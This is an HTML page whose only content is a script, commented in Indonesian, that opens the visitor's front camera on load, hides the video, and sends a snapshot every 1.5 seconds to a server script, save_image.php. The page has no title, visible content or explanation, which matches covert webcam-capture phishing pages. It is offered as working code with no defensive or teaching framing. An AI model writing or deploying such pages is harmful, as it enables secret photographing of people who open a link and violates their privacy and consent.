<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <script>
        const constraints = {
    audio: false,
    video: {
        facingMode: 'user'
    }
};

async function captureImage() {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    const video = document.createElement('video');
    video.style.display = 'none'; 

    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = 640;
    canvas.height = 480;

    // Memulai perekaman gambar secara otomatis setiap 1,5 detik (1500 milidetik)
    setInterval(function() {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');
        
        // Kirim gambar ke server menggunakan AJAX atau fetch
        sendImageToServer(imageData);
    }, 1500);

    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
}

function sendImageToServer(imageData) {
    fetch('save_image.php', {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        console.log(data.message);
    })
    .catch(error => {
        console.error('Gagal mengirim gambar ke server:', error);
    });
}

captureImage();
</script>
</body>
</html>

